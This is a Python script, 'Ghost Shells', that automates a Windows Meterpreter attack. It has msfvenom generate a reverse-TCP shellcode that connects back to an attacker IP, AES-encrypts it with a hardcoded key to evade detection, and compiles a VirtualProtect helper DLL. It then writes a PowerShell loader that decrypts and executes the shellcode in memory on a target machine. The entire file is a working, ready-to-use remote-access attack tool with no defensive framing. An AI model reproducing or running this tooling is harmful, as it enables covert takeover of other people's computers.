import subprocess
import base64
from Crypto.Cipher import AES
import os

# AES encryption settings
KEY = b"s3cr3tK3y1234567"  # 16-byte AES key
IV = b"initvector123456"  # 16-byte IV

def generate_meterpreter_payload(lhost, lport):
    """Generate Base64-encoded Meterpreter shellcode using msfvenom"""
    print("[+] Generating Meterpreter shellcode...")
    cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw | base64"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode != 0:
        print("[-] Error generating shellcode:", result.stderr)
        return None
    
    return result.stdout.strip()

def pad_shellcode(shellcode):
    """Apply PKCS7 padding to meet AES block size (16 bytes)"""
    padding_length = 16 - (len(shellcode) % 16)
    return shellcode + bytes([padding_length]) * padding_length

def encrypt_shellcode(base64_shellcode):
    """Encrypts shellcode using AES (CBC Mode)"""
    raw_shellcode = base64.b64decode(base64_shellcode)
    padded_shellcode = pad_shellcode(raw_shellcode)
    
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted_shellcode = cipher.encrypt(padded_shellcode)
    
    return base64.b64encode(encrypted_shellcode).decode()

def create_api_dll():
    """Generate API.dll for VirtualProtect memory modifications"""
    api_code = '''
using System;
using System.Runtime.InteropServices;

public class API
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static bool SetMemoryExecutable(IntPtr address, int size)
    {
        uint oldProtect;
        return VirtualProtect(address, (UIntPtr)size, PAGE_EXECUTE_READWRITE, out oldProtect);
    }
}
'''
    with open("API.cs", "w") as f:
        f.write(api_code)

    print("[+] Compiling API.dll...")
    subprocess.run("mcs -target:library -out:API.dll API.cs", shell=True)

def create_powershell_script(encrypted_shellcode):
    """Create a PowerShell script to decrypt and execute the shellcode"""
    ps_script = f'''
# Load API.dll
$apiPath = ".\\API.dll"
Add-Type -Path $apiPath

# Encrypted Base64 Shellcode
$encShellcode = "{encrypted_shellcode}"

# AES Key and IV
$Key = [System.Text.Encoding]::ASCII.GetBytes("s3cr3tK3y1234567")
$IV = [System.Text.Encoding]::ASCII.GetBytes("initvector123456")

# Convert Base64 to bytes
$encShellcodeBytes = [Convert]::FromBase64String($encShellcode)

# Create AES decryptor
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.Key = $Key
$AES.IV = $IV

$Decryptor = $AES.CreateDecryptor()
$MemStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemStream, $Decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

# Decrypt shellcode
$CryptoStream.Write($encShellcodeBytes, 0, $encShellcodeBytes.Length)
$CryptoStream.FlushFinalBlock()
$shellcode = $MemStream.ToArray()

# Allocate memory for shellcode
$size = $shellcode.Length
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $size)

# Change memory protection to EXECUTE_READWRITE (0x40)
[uint32]$oldProtect = 0
[API]::VirtualProtect($mem, [uint32]$size, 0x40, [ref]$oldProtect)

# Define delegate type for shellcode execution
$DelegateType = Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ShellcodeRunner
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void ShellcodeDelegate();
}
"@ -PassThru

# Convert memory address to function pointer
$ExecShellcode = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [ShellcodeRunner+ShellcodeDelegate])

# Execute shellcode
Write-Host "[+] Executing Shellcode..."
$ExecShellcode.Invoke()

# Free memory after execution
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
Write-Host "[+] Shellcode executed successfully!"
'''

    with open("execute.ps1", "w") as f:
        f.write(ps_script)

    print("[+] PowerShell script 'execute.ps1' created.")

if __name__ == "__main__":
    print("[+] Ghost Shells - Automated Meterpreter Deployment")

    # Get LHOST and LPORT from user
    lhost = input("[?] Enter LHOST (attacker IP): ").strip()
    lport = input("[?] Enter LPORT (listening port): ").strip()

    if not lhost or not lport.isdigit():
        print("[-] Invalid input. Please enter a valid LHOST and LPORT.")
        exit(1)

    # Step 1: Generate Shellcode
    shellcode = generate_meterpreter_payload(lhost, lport)

    if not shellcode:
        exit(1)

    # Step 2: Encrypt Shellcode
    print("[+] Encrypting shellcode using AES...")
    encrypted_shellcode = encrypt_shellcode(shellcode)

    # Step 3: Compile API.dll
    create_api_dll()

    # Step 4: Create PowerShell Script
    create_powershell_script(encrypted_shellcode)

    print("[+] Ghost Shells deployment ready!")
    print("[+] Run 'execute.ps1' on target machine to execute Meterpreter payload.")
